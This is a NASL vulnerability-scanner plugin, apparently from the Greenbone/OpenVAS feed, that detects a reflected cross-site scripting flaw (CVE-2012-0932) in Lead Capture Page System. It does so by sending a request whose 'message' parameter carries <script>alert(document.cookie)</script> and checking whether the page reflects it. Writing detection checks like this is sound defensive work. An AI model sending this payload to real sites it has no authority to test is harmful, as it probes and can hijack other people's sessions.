if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802577" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-0932" );
	script_bugtraq_id( 51785 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-02-02 13:13:46 +0530 (Thu, 02 Feb 2012)" );
	script_name( "Lead Capture Page System 'message' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47702" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/72623" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/108887/leadcapturepagesystem-xss.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site." );
	script_tag( name: "affected", value: "Lead Capture Page System" );
	script_tag( name: "insight", value: "The flaw is due to an input passed to the 'message' parameter
  in 'admin/login.php' is not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Lead Capture Page System and is prone to
  cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", "/leadcapturepagesystem", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/login.php", port: port );
	if(egrep( pattern: "Powered By <a href=\"http://leadcapturepagesystem.com/", string: rcvRes )){
		sndReq = NASLString( "GET ", dir, "/admin/login.php?message=<script>alert(", "document.cookie)</script> HTTP/1.1", "\\r\\n", "Host: ", host, "\\r\\n\\r\\n" );
		rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "<script>alert(document.cookie)</script>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

